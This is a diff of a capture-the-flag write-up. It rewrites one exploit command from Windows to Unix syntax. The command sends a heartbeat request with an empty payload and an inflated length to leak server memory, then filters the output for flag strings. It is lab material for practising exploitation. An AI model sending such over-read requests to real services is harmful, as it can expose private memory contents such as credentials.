@@ -48,7 +48,7 @@ Notes:
 - Filter output for keywords like `GCTF`, `flag`, `ctf`.
 
 ```bat
-curl -s http://host:port/heartbeat -H "Content-Type: application/json" -d "{\"payload\":\"\",\"length\":8192}" | findstr /i "flag CTF GCTF"
+curl -s http://host:port/heartbeat -H "Content-Type: application/json" -d '{"payload":"","length":8192}' | grep -iE "flag|ctf|gctf"
 ```
 
 ## Flag
